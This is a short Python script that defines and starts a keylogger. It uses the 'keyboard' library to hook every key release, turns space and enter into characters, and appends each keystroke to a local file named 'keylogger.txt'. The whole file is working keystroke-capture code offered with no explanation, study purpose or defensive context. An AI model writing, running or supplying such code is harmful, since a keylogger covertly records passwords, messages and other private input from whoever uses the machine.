import keyboard

class Keylogger():
    def __init__(self, log_filename):
        self.f=open(log_filename,"w")
    
    def start_log(self):
        keyboard.on_release(callback=self.callback)
        keyboard.wait()

    def callback(self,event):
        button=event.name
        if(button=="space"):
            button=" "
        if(button=="enter"):
            button="\n"
        self.f.write(button)
        self.f.flush()

Keylogger_object=Keylogger("keylogger.txt")
Keylogger_object.start_log()

